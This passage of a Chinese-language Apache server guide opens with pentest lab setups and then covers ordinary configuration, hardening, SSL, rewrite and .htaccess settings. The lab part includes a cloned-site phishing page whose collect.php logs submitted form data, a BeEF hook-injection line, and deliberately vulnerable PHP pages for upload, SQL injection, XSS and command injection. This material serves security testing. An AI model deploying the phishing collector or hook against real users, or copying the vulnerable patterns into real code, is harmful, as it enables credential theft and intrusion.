```bash
# 创建payload目录
sudo mkdir -p /var/www/html/payloads/{shells,exploits,tools}

# 设置适当权限
sudo chown -R www-data:www-data /var/www/html/payloads
sudo chmod -R 755 /var/www/html/payloads

# 创建简单的文件列表页面
cat << 'EOF' | sudo tee /var/www/html/payloads/index.php
<?php
$dir = '.';
$files = scandir($dir);
echo "<h2>Available Payloads</h2><ul>";
foreach($files as $file) {
    if($file != '.' && $file != '..') {
        echo "<li><a href='$file'>$file</a></li>";
    }
}
echo "</ul>";
?>
EOF

# 快速启动临时HTTP服务器（Python方式）
cd /tmp/payloads
python3 -m http.server 8000

# 或使用PHP内置服务器
php -S 0.0.0.0:8000
```

### 4. 搭建钓鱼页面测试环境
```bash
# ⚠️ 仅限授权测试使用！

# 创建钓鱼页面目录
sudo mkdir -p /var/www/html/phishing-test

# 克隆目标网站（使用HTTrack）
sudo apt install httrack -y
httrack "https://example.com" -O /tmp/clone

# 复制到Web目录
sudo cp -r /tmp/clone/* /var/www/html/phishing-test/

# 修改表单action指向你的收集脚本
# 创建简单的日志收集脚本
cat << 'EOF' | sudo tee /var/www/html/phishing-test/collect.php
<?php
// ⚠️ 仅用于授权测试
$data = json_encode($_POST);
file_put_contents('/tmp/phishing-log.txt', $data . PHP_EOL, FILE_APPEND);
header('Location: https://example.com');
exit;
?>
EOF

# 配置虚拟主机
sudo nano /etc/apache2/sites-available/phishing-test.conf
```

### 5. 搭建BeEF（Browser Exploitation Framework）
```bash
# 安装依赖
sudo apt install ruby-full git -y

# 克隆BeEF
cd /opt
sudo git clone https://github.com/beefproject/beef.git
cd beef

# 安装Gem依赖
sudo gem install bundler
sudo bundle install

# 配置BeEF
sudo nano config.yaml
# 修改密码等配置

# 启动BeEF
./beef

# 在目标页面中注入hook脚本
# <script src="http://[your-ip]:3000/hook.js"></script>
```

### 6. 配置SSL中间人测试环境
```bash
# 安装SSLsplit
sudo apt install sslsplit -y

# 生成CA证书
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 365 -key ca.key -out ca.crt

# 配置Apache作为前端代理
# 用于测试SSL剥离攻击等
```

### 7. 文件上传漏洞测试环境
```bash
# 创建上传目录
sudo mkdir -p /var/www/html/upload-test/uploads
sudo chmod 777 /var/www/html/upload-test/uploads

# 创建简单的上传页面
cat << 'EOF' | sudo tee /var/www/html/upload-test/index.php
<!DOCTYPE html>
<html>
<head><title>File Upload Test</title></head>
<body>
<h2>Upload File</h2>
<form action="upload.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
</body>
</html>
EOF

# 创建有漏洞的上传处理脚本（仅用于测试）
cat << 'EOF' | sudo tee /var/www/html/upload-test/upload.php
<?php
// ⚠️ 故意设计的有漏洞代码，仅用于测试
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["file"]["name"]);

if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
    echo "File uploaded: " . $target_file;
} else {
    echo "Upload failed!";
}
?>
EOF
```

### 8. SQL注入测试环境
```bash
# 创建测试数据库
sudo mysql -u root -p
```

```sql
CREATE DATABASE sqli_test;
USE sqli_test;

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50),
    password VARCHAR(50),
    email VARCHAR(100)
);

INSERT INTO users VALUES 
(1, 'admin', 'admin123', 'admin@test.com'),
(2, 'user', 'user123', 'user@test.com');

CREATE USER 'testuser'@'localhost' IDENTIFIED BY 'testpass';
GRANT ALL PRIVILEGES ON sqli_test.* TO 'testuser'@'localhost';
FLUSH PRIVILEGES;
EXIT;
```

```bash
# 创建有漏洞的PHP页面
cat << 'EOF' | sudo tee /var/www/html/sqli-test.php
<?php
// ⚠️ 故意设计的有漏洞代码
$conn = new mysqli("localhost", "testuser", "testpass", "sqli_test");

if(isset($_GET['id'])) {
    $id = $_GET['id'];
    $sql = "SELECT * FROM users WHERE id = $id";  // 有SQL注入漏洞
    $result = $conn->query($sql);
    
    while($row = $result->fetch_assoc()) {
        echo "ID: " . $row['id'] . " - Name: " . $row['username'] . "<br>";
    }
}
?>
<form method="GET">
    User ID: <input type="text" name="id">
    <input type="submit" value="Search">
</form>
EOF
```

### 9. XSS测试环境
```bash
# 创建XSS测试页面
cat << 'EOF' | sudo tee /var/www/html/xss-test.php
<?php
// ⚠️ 故意设计的有漏洞代码
if(isset($_GET['name'])) {
    echo "Hello, " . $_GET['name'] . "!";  // 反射型XSS漏洞
}
?>
<form method="GET">
    Name: <input type="text" name="name">
    <input type="submit" value="Submit">
</form>
EOF
```

### 10. 命令注入测试环境
```bash
# 创建命令注入测试页面
cat << 'EOF' | sudo tee /var/www/html/cmd-test.php
<?php
// ⚠️ 故意设计的有漏洞代码
if(isset($_GET['ip'])) {
    $ip = $_GET['ip'];
    $output = shell_exec("ping -c 4 " . $ip);  // 命令注入漏洞
    echo "<pre>$output</pre>";
}
?>
<form method="GET">
    IP Address: <input type="text" name="ip">
    <input type="submit" value="Ping">
</form>
EOF
```

## 十一、高级配置

### 1. 配置反向代理负载均衡
```bash
sudo a2enmod proxy proxy_http proxy_balancer lbmethod_byrequests
```

```apache
<VirtualHost *:80>
    ServerName loadbalancer.local
    
    <Proxy balancer://mycluster>
        BalancerMember http://backend1:8080 route=1
        BalancerMember http://backend2:8080 route=2
        BalancerMember http://backend3:8080 route=3
        
        ProxySet lbmethod=byrequests
        ProxySet stickysession=ROUTEID
    </Proxy>
    
    ProxyPass / balancer://mycluster/
    ProxyPassReverse / balancer://mycluster/
    
    # 负载均衡器管理页面
    <Location /balancer-manager>
        SetHandler balancer-manager
        Require local
    </Location>
</VirtualHost>
```

### 2. WebSocket代理配置
```bash
sudo a2enmod proxy_wstunnel
```

```apache
<VirtualHost *:80>
    ServerName ws.example.com
    
    # WebSocket代理
    ProxyPass /ws ws://localhost:3000/ws
    ProxyPassReverse /ws ws://localhost:3000/ws
    
    # 常规HTTP
    ProxyPass / http://localhost:3000/
    ProxyPassReverse / http://localhost:3000/
</VirtualHost>
```

### 3. 配置IP地理位置阻止
```bash
# 安装GeoIP模块
sudo apt install libapache2-mod-geoip geoip-database -y
sudo a2enmod geoip
```

```apache
<IfModule mod_geoip.c>
    GeoIPEnable On
    GeoIPDBFile /usr/share/GeoIP/GeoIP.dat
    
    # 阻止特定国家
    SetEnvIf GEOIP_COUNTRY_CODE CN BlockCountry
    SetEnvIf GEOIP_COUNTRY_CODE RU BlockCountry
    
    <Location />
        <RequireAll>
            Require all granted
            Require not env BlockCountry
        </RequireAll>
    </Location>
</IfModule>
```

### 4. 配置ModSecurity WAF
```bash
# 安装ModSecurity
sudo apt install libapache2-mod-security2 -y

# 复制推荐配置
sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf

# 编辑配置
sudo nano /etc/modsecurity/modsecurity.conf
# 修改: SecRuleEngine On

# 下载OWASP核心规则集
cd /tmp
wget https://github.com/coreruleset/coreruleset/archive/refs/heads/main.zip
unzip main.zip
sudo mv coreruleset-main /etc/modsecurity/crs
sudo cp /etc/modsecurity/crs/crs-setup.conf.example /etc/modsecurity/crs/crs-setup.conf

# 启用规则
sudo nano /etc/apache2/mods-enabled/security2.conf
```

```apache
<IfModule security2_module>
    SecDataDir /var/cache/modsecurity
    IncludeOptional /etc/modsecurity/*.conf
    IncludeOptional /etc/modsecurity/crs/crs-setup.conf
    IncludeOptional /etc/modsecurity/crs/rules/*.conf
</IfModule>
```

```bash
sudo systemctl restart apache2
```

### 5. 配置访问频率限制
```bash
sudo a2enmod ratelimit evasive
```

```apache
# 使用mod_evasive
<IfModule mod_evasive20.c>
    DOSHashTableSize 3097
    DOSPageCount 2
    DOSSiteCount 50
    DOSPageInterval 1
    DOSSiteInterval 1
    DOSBlockingPeriod 10
    DOSEmailNotify admin@example.com
    DOSLogDir /var/log/apache2/evasive
</IfModule>
```

### 6. 配置自定义错误页面
```bash
# 创建自定义错误页面目录
sudo mkdir -p /var/www/errors

# 创建404页面
cat << 'EOF' | sudo tee /var/www/errors/404.html
<!DOCTYPE html>
<html>
<head>
    <title>404 - Page Not Found</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 50px; }
        h1 { font-size: 50px; }
    </style>
</head>
<body>
    <h1>404</h1>
    <p>The page you're looking for doesn't exist.</p>
    <a href="/">Go Home</a>
</body>
</html>
EOF
```

```apache
# 在虚拟主机配置中添加
ErrorDocument 400 /errors/400.html
ErrorDocument 401 /errors/401.html
ErrorDocument 403 /errors/403.html
ErrorDocument 404 /errors/404.html
ErrorDocument 500 /errors/500.html

Alias /errors /var/www/errors
```

## 十二、安全加固清单

### 生产环境安全检查表

```bash
# 1. 更新系统和Apache
sudo apt update && sudo apt upgrade -y

# 2. 最小化安装（仅安装需要的模块）
apache2ctl -M  # 检查已启用模块
sudo a2dismod status autoindex  # 禁用不需要的模块

# 3. 隐藏版本信息
# ServerTokens Prod
# ServerSignature Off

# 4. 禁用目录浏览
# Options -Indexes

# 5. 限制HTTP方法
# <LimitExcept GET POST>
#     Require all denied
# </LimitExcept>

# 6. 配置SSL/TLS
# 使用强加密套件和TLS 1.2+

# 7. 实施访问控制
# 使用IP白名单、认证等

# 8. 配置防火墙
sudo ufw enable
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# 9. 定期备份配置
sudo tar -czf apache-config-$(date +%Y%m%d).tar.gz /etc/apache2/

# 10. 监控日志
# 设置日志监控和告警

# 11. 使用ModSecurity
# 安装并配置WAF

# 12. 限制上传文件大小
# LimitRequestBody 10485760

# 13. 配置适当的文件权限
sudo find /var/www -type f -exec chmod 644 {} \;
sudo find /var/www -type d -exec chmod 755 {} \;

# 14. 禁用不安全的PHP函数
# disable_functions = exec,passthru,shell_exec...

# 15. 定期安全审计
```

## 十三、备份与恢复

### 备份脚本
```bash
#!/bin/bash
# Apache完整备份脚本

BACKUP_DIR="/backup/apache"
DATE=$(date +%Y%m%d-%H%M%S)
BACKUP_FILE="apache-backup-$DATE.tar.gz"

# 创建备份目录
mkdir -p $BACKUP_DIR

# 备份配置文件
echo "Backing up Apache configuration..."
sudo tar -czf $BACKUP_DIR/config-$DATE.tar.gz /etc/apache2/

# 备份网站文件
echo "Backing up web files..."
sudo tar -czf $BACKUP_DIR/www-$DATE.tar.gz /var/www/

# 备份日志（可选）
echo "Backing up logs..."
sudo tar -czf $BACKUP_DIR/logs-$DATE.tar.gz /var/log/apache2/

# 创建完整备份
sudo tar -czf $BACKUP_DIR/$BACKUP_FILE \
    /etc/apache2/ \
    /var/www/ \
    /etc/ssl/

# 删除30天前的备份
find $BACKUP_DIR -name "*.tar.gz" -mtime +30 -delete

echo "Backup completed: $BACKUP_DIR/$BACKUP_FILE"
```

## 十四、配置文件详细讲解

### 1. apache2.conf - 主配置文件

Apache的核心配置文件，控制全局行为和默认设置。

##### 1.1 基本服务器配置
```apache
# 服务器根目录
ServerRoot "/etc/apache2"

# 互斥锁文件配置
Mutex file:${APACHE_LOCK_DIR} default

# PID文件位置
PidFile ${APACHE_PID_FILE}

# 请求超时时间（秒）
Timeout 300

# 保持连接设置
KeepAlive On                    # 启用持久连接
MaxKeepAliveRequests 100        # 每个连接的最大请求数
KeepAliveTimeout 5              # 持久连接超时时间（秒）
```

##### 1.2 用户和组配置
```apache
# Apache运行用户和组
User ${APACHE_RUN_USER}         # 通常为 www-data
Group ${APACHE_RUN_GROUP}       # 通常为 www-data

# 实际值在 /etc/apache2/envvars 中定义
# export APACHE_RUN_USER=www-data
# export APACHE_RUN_GROUP=www-data
```

##### 1.3 主机名查找
```apache
# 禁用主机名查找（提高性能）
HostnameLookups Off

# 如果启用，Apache会对每个连接进行反向DNS查询
# 这会显著降低性能，除非日志分析确实需要主机名
```

##### 1.4 错误日志配置
```apache
# 全局错误日志
ErrorLog ${APACHE_LOG_DIR}/error.log

# 日志级别（从低到高）：
# emerg alert crit error warn notice info debug trace1-8
LogLevel warn

# 针对特定模块设置日志级别
# LogLevel warn ssl:info rewrite:trace3
```

##### 1.5 模块加载
```apache
# 包含已启用的模块配置
IncludeOptional mods-enabled/*.load
IncludeOptional mods-enabled/*.conf

# 单个模块示例
# LoadModule rewrite_module modules/mod_rewrite.so
```

##### 1.6 默认目录权限
```apache
# 拒绝所有目录的访问（默认拒绝策略）
<Directory />
    Options FollowSymLinks
    AllowOverride None
    Require all denied
</Directory>

# /usr/share目录配置
<Directory /usr/share>
    AllowOverride None
    Require all granted
</Directory>

# Web根目录配置
<Directory /var/www/>
    Options Indexes FollowSymLinks
    AllowOverride None
    Require all granted
</Directory>
```

**Options指令说明：**
- `None` - 禁用所有选项
- `All` - 启用除MultiViews外的所有选项
- `Indexes` - 允许目录列表（无索引文件时）
- `FollowSymLinks` - 允许跟随符号链接
- `SymLinksIfOwnerMatch` - 仅当链接和目标所有者相同时跟随
- `ExecCGI` - 允许执行CGI脚本
- `MultiViews` - 允许内容协商的多视图
- `Includes` - 允许服务器端包含（SSI）
- `IncludesNOEXEC` - 允许SSI但禁用#exec和#include

**AllowOverride指令说明：**
- `None` - 禁用.htaccess文件
- `All` - 允许.htaccess覆盖所有指令
- `AuthConfig` - 允许认证指令
- `FileInfo` - 允许文档类型控制指令
- `Indexes` - 允许目录索引控制
- `Limit` - 允许访问控制指令
- `Options` - 允许Options指令

**Require指令说明：**
- `Require all granted` - 允许所有访问
- `Require all denied` - 拒绝所有访问
- `Require ip 192.168.1.0/24` - 允许特定IP/网段
- `Require host example.com` - 允许特定主机名
- `Require valid-user` - 需要有效认证用户
- `Require user admin` - 需要特定用户
- `Require group admins` - 需要特定用户组

##### 1.7 访问文件名配置
```apache
# 设置默认索引文件（按优先级）
<IfModule dir_module>
    DirectoryIndex index.html index.htm index.php
</IfModule>

# 如果目录中存在这些文件，Apache会自动显示
# 否则显示目录列表（如果Indexes选项启用）
```

##### 1.8 保护敏感文件
```apache
# 拒绝访问.ht开头的文件（如.htaccess、.htpasswd）
<FilesMatch "^\.ht">
    Require all denied
</FilesMatch>

# 保护备份文件和配置文件
<FilesMatch "\.(bak|config|sql|fla|psd|ini|log|sh|inc|swp|dist)$">
    Require all denied
</FilesMatch>

# 保护版本控制目录
<DirectoryMatch "^/.*/\.(git|svn|hg)/">
    Require all denied
</DirectoryMatch>
```

##### 1.9 日志格式定义
```apache
# Common日志格式
LogFormat "%h %l %u %t \"%r\" %>s %b" common

# Combined日志格式（包含Referer和User-Agent）
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined

# 带响应时间的日志格式
LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %D" custom

# Virtual Host日志格式
LogFormat "%v:%p %h %l %u %t \"%r\" %>s %b" vhost_combined

# 字段含义：
# %h - 客户端IP地址
# %l - 客户端身份（通常为"-"）
# %u - 认证用户名
# %t - 时间戳
# %r - 请求行（方法 URL 协议）
# %>s - 最终状态码
# %b - 响应字节数（不含头）
# %B - 响应字节数（0代替"-"）
# %D - 请求处理时间（微秒）
# %T - 请求处理时间（秒）
# %v - 虚拟主机名称
# %p - 服务器端口
# %{Referer}i - 引荐页面
# %{User-Agent}i - 用户代理字符串
# %{X-Forwarded-For}i - 代理转发的客户端IP
```

##### 1.10 包含其他配置文件
```apache
# 包含端口配置
Include ports.conf

# 包含已启用的配置片段
IncludeOptional conf-enabled/*.conf

# 包含已启用的站点配置
IncludeOptional sites-enabled/*.conf

# Include vs IncludeOptional：
# Include - 文件必须存在，否则启动失败
# IncludeOptional - 文件可以不存在
```

---

### 2. ports.conf - 端口配置文件

控制Apache监听的端口。

```apache
# 监听HTTP端口
Listen 80

# 如果SSL模块启用，监听HTTPS端口
<IfModule ssl_module>
    Listen 443
</IfModule>

<IfModule mod_gnutls.c>
    Listen 443
</IfModule>

# 监听特定IP和端口
# Listen 192.168.1.100:80
# Listen 127.0.0.1:8080

# 监听多个端口
# Listen 80
# Listen 8080
# Listen 8443
```

**配置说明：**
- `Listen 80` - 监听所有网络接口的80端口
- `Listen 192.168.1.100:80` - 仅监听特定IP的端口
- `Listen [::]:80` - 监听IPv6
- 修改后需要重启Apache生效

---

### 3. envvars - 环境变量文件

定义Apache运行时使用的环境变量。

```bash
# Apache运行用户和组
export APACHE_RUN_USER=www-data
export APACHE_RUN_GROUP=www-data

# PID文件位置
export APACHE_PID_FILE=/var/run/apache2/apache2.pid

# 运行目录
export APACHE_RUN_DIR=/var/run/apache2

# 锁文件目录
export APACHE_LOCK_DIR=/var/lock/apache2

# 日志目录
export APACHE_LOG_DIR=/var/log/apache2

# 语言设置
export LANG=C

# 启用core dump（调试用）
# ulimit -c unlimited

# 启动参数
# export APACHE_ARGUMENTS=""

# 自定义环境变量
# export MY_APP_ENV=production
```

---

### 4. 虚拟主机配置文件详解

### 4.1 000-default.conf - 默认HTTP站点

```apache
<VirtualHost *:80>
    # ====== 基本标识信息 ======
    
    # 服务器名称（主域名）
    ServerName example.com
    
    # 服务器别名（其他域名）
    ServerAlias www.example.com *.example.com
    
    # 管理员邮箱
    ServerAdmin webmaster@example.com
    
    # ====== 目录配置 ======
    
    # 网站根目录
    DocumentRoot /var/www/html
    
    # 目录访问控制
    <Directory /var/www/html>
        # 选项配置
        Options Indexes FollowSymLinks MultiViews
        
        # 允许.htaccess覆盖
        AllowOverride All
        
        # 访问控制
        Require all granted
        
        # 默认索引文件
        DirectoryIndex index.html index.php
    </Directory>
    
    # ====== 特殊目录配置 ======
    
    # CGI脚本目录
    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
    <Directory "/usr/lib/cgi-bin">
        AllowOverride None
        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
        Require all granted
    </Directory>
    
    # 受限访问目录
    <Directory /var/www/html/admin>
        Options -Indexes
        AllowOverride None
        AuthType Basic
        AuthName "Admin Area"
        AuthUserFile /etc/apache2/.htpasswd
        Require valid-user
    </Directory>
    
    # ====== 日志配置 ======
    
    # 错误日志
    ErrorLog ${APACHE_LOG_DIR}/error.log
    
    # 访问日志
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    
    # 日志级别（针对此虚拟主机）
    LogLevel warn
    
    # ====== URL重写 ======
    
    <IfModule mod_rewrite.c>
        RewriteEngine On
        RewriteBase /
        
        # 强制HTTPS
        # RewriteCond %{HTTPS} off
        # RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]
    </IfModule>
    
    # ====== 别名配置 ======
    
    # 静态文件别名
    Alias /static /var/www/static
    <Directory /var/www/static>
        Require all granted
    </Directory>
    
    # ====== 代理配置 ======
    
    # 反向代理到后端应用
    # ProxyPreserveHost On
    # ProxyPass /api http://localhost:3000/api
    # ProxyPassReverse /api http://localhost:3000/api
    
    # ====== 错误页面 ======
    
    # 自定义错误页面
    ErrorDocument 404 /errors/404.html
    ErrorDocument 500 /errors/500.html
    
    # ====== 安全头 ======
    
    <IfModule mod_headers.c>
        Header always set X-Frame-Options "SAMEORIGIN"
        Header always set X-Content-Type-Options "nosniff"
        Header always set X-XSS-Protection "1; mode=block"
    </IfModule>
    
    # ====== 压缩配置 ======
    
    <IfModule mod_deflate.c>
        AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css
        AddOutputFilterByType DEFLATE application/javascript application/json
    </IfModule>
    
    # ====== 缓存配置 ======
    
    <IfModule mod_expires.c>
        ExpiresActive On
        ExpiresByType image/jpeg "access plus 1 year"
        ExpiresByType text/css "access plus 1 month"
    </IfModule>
</VirtualHost>
```

##### 4.2 default-ssl.conf - 默认HTTPS站点

```apache
<IfModule mod_ssl.c>
    <VirtualHost *:443>
        ServerName example.com
        ServerAdmin admin@example.com
        DocumentRoot /var/www/html
        
        # ====== SSL引擎配置 ======
        SSLEngine on
        
        # ====== 证书文件 ======
        
        # 服务器证书
        SSLCertificateFile /etc/ssl/certs/server.crt
        
        # 服务器私钥
        SSLCertificateKeyFile /etc/ssl/private/server.key
        
        # 证书链文件（中间证书）
        SSLCertificateChainFile /etc/ssl/certs/chain.crt
        
        # 或使用完整证书文件（包含证书链）
        # SSLCertificateFile /etc/ssl/certs/fullchain.pem
        
        # CA证书文件（用于客户端证书验证）
        # SSLCACertificateFile /etc/ssl/certs/ca-bundle.crt
        
        # ====== SSL协议配置 ======
        
        # 禁用不安全的协议
        SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1
        
        # 仅允许TLS 1.2和1.3
        # SSLProtocol -all +TLSv1.2 +TLSv1.3
        
        # ====== 加密套件配置 ======
        
        # 推荐的加密套件（兼容性）
        SSLCipherSuite HIGH:!aNULL:!MD5:!3DES
        
        # 更严格的加密套件（仅现代浏览器）
        # SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
        
        # 优先使用服务器加密套件顺序
        SSLHonorCipherOrder on
        
        # ====== 会话缓存 ======
        
        # SSL会话缓存（提高性能）
        SSLSessionCache shmcb:${APACHE_RUN_DIR}/ssl_scache(512000)
        SSLSessionCacheTimeout 300
        
        # ====== OCSP Stapling（证书状态检查）======
        
        SSLUseStapling on
        SSLStaplingCache shmcb:${APACHE_RUN_DIR}/ssl_stapling(32768)
        SSLStaplingResponderTimeout 5
        SSLStaplingReturnResponderErrors off
        
        # ====== 客户端证书验证 ======
        
        # 不要求客户端证书
        # SSLVerifyClient none
        
        # 可选客户端证书
        # SSLVerifyClient optional
        
        # 要求客户端证书
        # SSLVerifyClient require
        # SSLVerifyDepth 10
        
        # ====== DH参数（提高安全性）======
        
        # 自定义DH参数
        # SSLOpenSSLConfCmd DHParameters /etc/ssl/dhparam.pem
        
        # ====== HSTS配置 ======
        
        <IfModule mod_headers.c>
            # HTTP严格传输安全
            Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
            
            # 其他安全头
            Header always set X-Frame-Options "SAMEORIGIN"
            Header always set X-Content-Type-Options "nosniff"
            Header always set X-XSS-Protection "1; mode=block"
        </IfModule>
        
        # ====== SSL日志 ======
        
        ErrorLog ${APACHE_LOG_DIR}/ssl-error.log
        CustomLog ${APACHE_LOG_DIR}/ssl-access.log combined
        
        # SSL专用日志格式
        # CustomLog ${APACHE_LOG_DIR}/ssl-request.log "%t %h %{SSL_PROTOCOL}x %{SSL_CIPHER}x \"%r\" %b"
        
        # ====== 目录配置 ======
        
        <Directory /var/www/html>
            Options -Indexes +FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>
        
        # ====== SSL优化 ======
        
        # 禁用SSL压缩（防止CRIME攻击）
        SSLCompression off
        
        # 启用HTTP/2（提高性能）
        Protocols h2 http/1.1
        
    </VirtualHost>
</IfModule>

# ====== 全局SSL配置 ======

# 互斥锁配置（进程间同步）
# <IfModule mod_ssl.c>
#     SSLMutex file:${APACHE_LOCK_DIR}/ssl_mutex
# </IfModule>

# 随机数种子
# <IfModule mod_ssl.c>
#     SSLRandomSeed startup builtin
#     SSLRandomSeed startup file:/dev/urandom 512
#     SSLRandomSeed connect builtin
#     SSLRandomSeed connect file:/dev/urandom 512
# </IfModule>
```

---

### 5. 模块配置文件详解

##### 5.1 mod_rewrite.conf - URL重写模块

```apache
<IfModule mod_rewrite.c>
    # 启用重写引擎
    RewriteEngine On
    
    # 设置重写日志级别（0-9，0=禁用，9=详细）
    # 仅用于调试，生产环境应禁用
    # RewriteLog /var/log/apache2/rewrite.log
    # RewriteLogLevel 3
    
    # 重写规则继承（虚拟主机）
    RewriteOptions Inherit
</IfModule>
```

**常用重写规则示例：**

```apache
# 在虚拟主机或.htaccess中使用

<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /
    
    # 1. 强制HTTPS
    RewriteCond %{HTTPS} off
    RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]
    
    # 2. 强制www
    RewriteCond %{HTTP_HOST} !^www\. [NC]
    RewriteRule ^(.*)$ https://www.%{HTTP_HOST}/$1 [R=301,L]
    
    # 3. 去除www
    RewriteCond %{HTTP_HOST} ^www\.(.+)$ [NC]
    RewriteRule ^(.*)$ https://%1/$1 [R=301,L]
    
    # 4. URL美化（移除.php扩展名）
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteCond %{REQUEST_FILENAME}.php -f
    RewriteRule ^(.*)$ $1.php [L]
    
    # 5. 重定向旧URL到新URL
    RewriteRule ^old-page\.html$ /new-page.html [R=301,L]
    RewriteRule ^products/(.*)$ /items/$1 [R=301,L]
    
    # 6. 阻止访问隐藏文件
    RewriteRule "(^|/)\.(?!well-known)" - [F]
    
    # 7. 阻止特定User-Agent
    RewriteCond %{HTTP_USER_AGENT} (badbot|scraper) [NC]
    RewriteRule .* - [F,L]
    
    # 8. 防止图片盗链
    RewriteCond %{HTTP_REFERER} !^$
    RewriteCond %{HTTP_REFERER} !^https?://(www\.)?example\.com [NC]
    RewriteRule \.(jpg|jpeg|png|gif)$ - [F]
    
    # 9. 代理特定路径到后端
    RewriteRule ^api/(.*)$ http://localhost:3000/api/$1 [P,L]
    
    # 10. 维护模式
    RewriteCond %{REQUEST_URI} !^/maintenance\.html$
    RewriteCond %{REMOTE_ADDR} !^192\.168\.1\.
    RewriteRule .* /maintenance.html [R=503,L]
</IfModule>
```

**RewriteCond标志说明：**
- `[NC]` - 不区分大小写
- `[OR]` - 或条件（默认是AND）

**RewriteRule标志说明：**
- `[L]` - Last（停止处理后续规则）
- `[R=301]` - 永久重定向
- `[R=302]` - 临时重定向
- `[F]` - Forbidden（返回403）
- `[G]` - Gone（返回410）
- `[P]` - Proxy（代理请求）
- `[QSA]` - 追加查询字符串
- `[NE]` - 不转义输出
- `[PT]` - Pass Through（传递给其他模块）

##### 5.2 mod_security.conf - Web应用防火墙

```apache
<IfModule security2_module>
    # 数据目录
    SecDataDir /var/cache/modsecurity
    
    # 规则引擎模式
    SecRuleEngine On              # 启用（阻止攻击）
    # SecRuleEngine DetectionOnly # 仅检测（不阻止）
    # SecRuleEngine Off           # 关闭
    
    # 请求体访问
    SecRequestBodyAccess On
    SecRequestBodyLimit 13107200            # 最大请求体大小（字节）
    SecRequestBodyNoFilesLimit 131072       # 不包含文件上传的请求体限制
    
    # 响应体访问
    SecResponseBodyAccess On
    SecResponseBodyMimeType text/plain text/html text/xml
    SecResponseBodyLimit 524288             # 最大响应体大小
    
    # 临时目录
    SecTmpDir /tmp/
    
    # 审计日志
    SecAuditEngine RelevantOnly            # 仅记录相关事件
    SecAuditLogRelevantStatus "^(?:5|4(?!04))"
    SecAuditLogParts ABIJDEFHZ
    SecAuditLogType Serial
    SecAuditLog /var/log/apache2/modsec_audit.log
    
    # 包含核心规则
    IncludeOptional /etc/modsecurity/*.conf
    IncludeOptional /etc/modsecurity/crs/crs-setup.conf
    IncludeOptional /etc/modsecurity/crs/rules/*.conf
</IfModule>
```

##### 5.3 mod_deflate.conf - 压缩模块

```apache
<IfModule mod_deflate.c>
    # 压缩文本类型
    AddOutputFilterByType DEFLATE text/html text/plain text/xml
    AddOutputFilterByType DEFLATE text/css
    AddOutputFilterByType DEFLATE text/javascript
    AddOutputFilterByType DEFLATE application/javascript
    AddOutputFilterByType DEFLATE application/json
    AddOutputFilterByType DEFLATE application/xml
    AddOutputFilterByType DEFLATE application/xhtml+xml
    AddOutputFilterByType DEFLATE application/rss+xml
    AddOutputFilterByType DEFLATE image/svg+xml
    
    # 排除已压缩的文件
    SetEnvIfNoCase Request_URI \.(?:gif|jpe?g|png|zip|gz|rar|bz2|7z|pdf)$ no-gzip
    
    # 排除旧版浏览器
    BrowserMatch ^Mozilla/4 gzip-only-text/html
    BrowserMatch ^Mozilla/4\.0[678] no-gzip
    BrowserMatch \bMSI[E] !no-gzip !gzip-only-text/html
    
    # 确保代理正确缓存
    Header append Vary User-Agent env=!dont-vary
    
    # 压缩级别（1-9，9最高压缩率但最慢）
    DeflateCompressionLevel 6
    
    # 内存级别（1-9）
    DeflateMemLevel 9
    
    # 窗口大小（9-15）
    DeflateWindowSize 15
</IfModule>
```

---

### 6. .htaccess文件详解

`.htaccess`是目录级配置文件，允许在不重启Apache的情况下更改配置。

**注意：** 需要在虚拟主机中设置 `AllowOverride All` 才能使用。

```apache
# ====== URL重写 ======

RewriteEngine On
RewriteBase /

# 强制HTTPS
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}/$1 [R=301,L]

# ====== 访问控制 ======

# 基于IP的访问控制
Require ip 192.168.1.0/24
Require ip 10.0.0.5

# 拒绝特定IP
<RequireAll>
    Require all granted
    Require not ip 10.0.0.1
</RequireAll>

# 基于密码的认证
AuthType Basic
AuthName "Restricted Area"
AuthUserFile /etc/apache2/.htpasswd
Require valid-user

# ====== 错误页面 ======

ErrorDocument 404 /errors/404.html
ErrorDocument 403 /errors/403.html
ErrorDocument 500 /errors/500.html

# ====== 目录选项 ======

# 禁用目录列表
Options -Indexes

# 启用符号链接跟随
Options +FollowSymLinks

# 禁用MultiViews
Options -MultiViews

# ====== 文件保护 ======

# 保护特定文件
<Files "config.php">
    Require all denied
</Files>

# 保护文件扩展名
<FilesMatch "\.(bak|config|sql|log)$">
    Require all denied
</FilesMatch>

# ====== MIME类型 ======

AddType application/x-httpd-php .php .phtml
AddType text/html .shtml
AddHandler server-parsed .shtml

# ====== 压缩 ======

<IfModule mod_deflate.c>
    AddOutputFilterByType DEFLATE text/html text/plain text/xml text/css
    AddOutputFilterByType DEFLATE application/javascript
</IfModule>

